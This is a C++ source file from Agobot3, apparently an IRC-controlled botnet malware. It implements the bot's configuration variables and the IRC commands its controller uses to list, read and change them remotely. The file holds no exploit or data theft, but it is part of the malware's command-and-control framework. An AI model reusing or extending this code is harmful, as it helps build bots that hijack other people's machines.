/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "cvar.h"
#include "mainctrl.h"

CMutex g_mCVarMutex;
	
CCVar::CCVar() { m_lCvars.clear(); }
CCVar::~CCVar() {
	list<cvar*>::iterator ic; for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ic++)
		if((*ic)->bDynamic) delete (*ic); }
void CCVar::Init()
{	m_lCvars.clear();
	REGCMD(m_cmdList,		"cvar.list",		"prints a list of all cvars",	false,	this);
	REGCMD(m_cmdGet,		"cvar.get",			"gets the content of a cvar",	false,	this);
	REGCMD(m_cmdSet,		"cvar.set",			"sets the content of a cvar",	false,	this);
	REGCMD(m_cmdLoadConfig,	"cvar.loadconfig",	"loads config from a file",		false,	this);
	REGCMD(m_cmdSaveConfig,	"cvar.saveconfig",	"saves config to a file",		false,	this); }

void CCVar::RegisterCvar(cvar *pCvar, const CString &sName, const CString &sValue, const CString &sDescription, bool bSave, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sName.Assign(sName); pCvar->sDescription.Assign(sDescription); pCvar->bSave=bSave;
	g_mCVarMutex.Unlock(); SetCVar(pCvar, sValue); g_mCVarMutex.Lock();
	pCvar->sValue.Assign(sValue);
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	pCvar->bDynamic=false; m_lCvars.push_back(pCvar); g_mCVarMutex.Unlock(); }
void CCVar::RegisterCvar(cvar *pCvar, const char *szName, const char *szValue, const char *szDescription, bool bSave, char *szKey) {
	RegisterCvar(pCvar, CString(szName), CString(szValue), CString(szDescription), bSave, szKey); }

cvar *CCVar::TempCvar(const CString &sName, const CString &sValue, char *szKey) {
	cvar *pCvar=new cvar; g_mCVarMutex.Lock(); pCvar->sName.Assign(sName);
	g_mCVarMutex.Unlock(); SetCVar(pCvar, sValue); g_mCVarMutex.Lock();
	pCvar->sValue.Assign(sValue);
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	pCvar->bDynamic=true; m_lCvars.push_back(pCvar); g_mCVarMutex.Unlock();
	return pCvar; }
cvar *CCVar::TempCvar(const char *szName, const char *szValue, char *szKey) {
	return TempCvar(CString(szName), CString(szValue), szKey); }

cvar *CCVar::FindCvarByName(const CString &sName, bool bExact)
{	g_mCVarMutex.Lock();
	list<cvar*>::iterator ic; int iCount=0;
	for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic)
		if(!(*ic)->sName.CompareNoCase(sName)) {
			g_mCVarMutex.Unlock(); return (*ic); }
    g_mCVarMutex.Unlock(); return NULL; }
cvar *CCVar::FindCvarByName(const char *szName, bool bExact)
{	return FindCvarByName(CString(szName), bExact); }

bool CCVar::ParseConfig(const CString &sFilename)
{	return true; }
bool CCVar::ParseConfig(const char *szFilename)
{	return ParseConfig(CString(szFilename)); }

bool CCVar::SaveConfig(const CString &sFilename)
{	return true; }
bool CCVar::SaveConfig(const char *szFilename)
{	return SaveConfig(CString(szFilename)); }

void CCVar::SetCVar(cvar *pCvar, const char *szValue, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Assign(szValue);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, const CString &sValue)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Assign(sValue.m_szString);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true;
	pCvar->sValue.m_bIsCryptStr=sValue.m_bIsCryptStr;
	strncpy(pCvar->sValue.m_szKey, sValue.m_szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, float fValue, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Format("%f", fValue);
	pCvar->fValue=fValue; pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(fValue>=1) pCvar->bValue=true;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, bool bValue, char *szKey)
{	g_mCVarMutex.Lock();
	if(bValue) { pCvar->sValue.Assign("true"); pCvar->fValue=1.0f; pCvar->iValue=1; } 
	else { pCvar->sValue.Assign("false"); pCvar->fValue=0.0f; pCvar->iValue=0; }
	pCvar->bValue=bValue;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

void CCVar::SetCVar(cvar *pCvar, int iValue, char *szKey)
{	g_mCVarMutex.Lock();
	pCvar->sValue.Format("%d", iValue);
	pCvar->fValue=(float)iValue; pCvar->iValue=iValue;
	pCvar->bValue=false; if(iValue>=1) pCvar->bValue=true;
	if(szKey) pCvar->sValue.m_bIsCryptStr=true; else pCvar->sValue.m_bIsCryptStr=false;
	if(szKey) strncpy(pCvar->sValue.m_szKey, szKey, sizeof(pCvar->sValue.m_szKey));
	g_mCVarMutex.Unlock(); }

bool CCVar::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("cvar.list"))
	{	g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ cvar list ]-", pMsg->sReplyTo.Str());
		g_mCVarMutex.Lock();
		list<cvar*>::iterator ic; int iCount=0;
		for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic)
		{	iCount++; g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%d. / \"%s\" / \"%s\" / \"%s\"", \
				iCount, (*ic)->sName.CStr(), (*ic)->sValue.CStr(), (*ic)->sDescription.CStr());
			Sleep(1500); }
		g_mCVarMutex.Unlock();
		return true; }

	else if(!pMsg->sCmd.Compare("cvar.get"))
	{	cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) return g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s == \"%s\"", pTemp->sName.CStr(), pTemp->sValue.CStr());
		else return false; }

	else if(!pMsg->sCmd.Compare("cvar.set"))
	{	cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) { CString sOldStr(pTemp->sValue); SetCVar(pTemp, pMsg->sChatString.Token(2, " ", true));
			g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s = \"%s\" (was \"%s\")", pTemp->sName.CStr(), pTemp->sValue.CStr(), sOldStr.CStr());
			return true; }
		else return false; }

	else if(!pMsg->sCmd.Compare("cvar.loadconfig"))
	{	if(ParseConfig(CString("")))
			return g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Successfully loaded config...");
		else
		{	g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Unable to load config...");
			return false; } }

	else if(!pMsg->sCmd.Compare("cvar.saveconfig"))
	{	if(SaveConfig(CString("")))
			return g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Successfully saved config...");
		else
		{	g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Unable to save config...");
			return false; } }

	return false; }
